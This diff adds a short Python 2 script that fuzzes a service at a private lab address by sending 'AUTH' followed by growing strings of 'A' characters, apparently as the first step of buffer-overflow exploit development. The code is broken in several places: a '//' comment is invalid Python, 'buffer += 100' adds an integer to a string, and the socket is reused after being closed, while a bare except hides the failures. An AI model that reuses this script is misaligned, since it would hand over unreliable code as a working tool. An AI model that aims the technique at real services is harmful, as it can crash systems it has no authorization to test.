@@ -1,0 +1,21 @@
+#!/usr/bin/python
+ 
+import socket
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ 
+buffer = "A" * 1000
+ 
+while len(buffer) <= 4000:
+    try:
+        print "We are fuzzing with a length of %s bytes" % len(buffer)
+        s.connect(('192.168.0.10', 5555))
+        print repr(s.recv(1024))
+        s.send('AUTH ' + buffer)
+        //s.send('PASS ' + buffer + '\r\n')
+        print repr(s.recv(1024))
+        s.close()
+        print"\nDone!"
+        buffer += 100
+    except:
+        print "[!] connection refused, check debugger"
